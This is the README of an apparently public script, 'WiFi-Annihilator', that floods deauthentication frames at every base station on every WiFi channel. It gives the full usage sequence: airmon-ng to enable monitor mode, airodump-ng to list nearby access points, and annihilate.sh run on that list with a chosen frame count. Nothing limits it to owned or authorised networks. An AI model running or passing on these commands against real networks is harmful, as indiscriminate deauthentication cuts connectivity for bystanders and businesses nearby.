# WiFi-Annihilator
A script that takes advantage of as many monitor mode WiFi cards as possible and then uses them to send an authentication attack on each WiFi channel.

How to use
----------

Using a Linux distrubution such as Kali, put your WiFi card into monitor mode and use `airodump-ng` to save a list of base stations to a CSV file, like so:

```
airmon-ng start wlan0
airodump-ng -w cap wlan0mon
```

`-w cap` can be replaced with whatever file name you want. For this example, we will be using the file named `cap-01.csv` (which will be generated with airodump-ng). After running airodump for about 10-15 seconds, close it using CTRL+C.

CD into the directory where the script in this repo is, set the appropriate file permissions and then execute it with the following arguments:

```
chmod 700 annihilate.sh
./annihilate.sh cap-01.csv
```

You can also specify how many deauthentication frames to send by specifying an additional argument, like so:

```
./annihilate.sh cap-01.csv 500
```

That will send 500 deauthentication frames, for each base station.
